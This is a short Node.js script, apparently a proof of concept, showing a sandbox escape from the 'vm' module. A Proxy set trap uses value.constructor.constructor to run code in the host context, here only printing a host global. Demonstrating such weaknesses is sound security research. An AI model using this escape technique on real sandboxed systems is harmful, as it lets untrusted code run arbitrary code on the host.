vm = require('vm');
sauce = "laser";

const code3 = `new Proxy({}, {
    set: function(me, key, value) { (value.constructor.constructor('console.log(sauce)'))() }
})`;

console.log("In this part it tries to assign to vm result and escape with laser in log")
data = vm.runInContext(code3, vm.createContext(Object.create(null)));
data['some_key'] = {};